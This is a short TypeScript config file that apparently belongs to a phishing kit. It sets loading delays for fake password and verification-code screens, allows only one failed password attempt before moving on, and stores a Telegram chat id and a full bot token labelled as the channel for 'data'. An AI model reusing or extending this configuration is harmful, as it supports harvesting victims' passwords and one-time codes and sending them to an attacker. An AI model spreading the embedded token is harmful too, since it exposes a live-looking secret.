interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 1000,
		max_failed_code_attempts: 4,
		max_failed_password_attempts: 1,
		password_loading_time: 1000,
	},
	telegram: {
		data_chatid: "1261037261",
		data_token: "8134902426:AAGKIcamw3b_KYkKlLGvznKiPbaKu_3qU2g",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
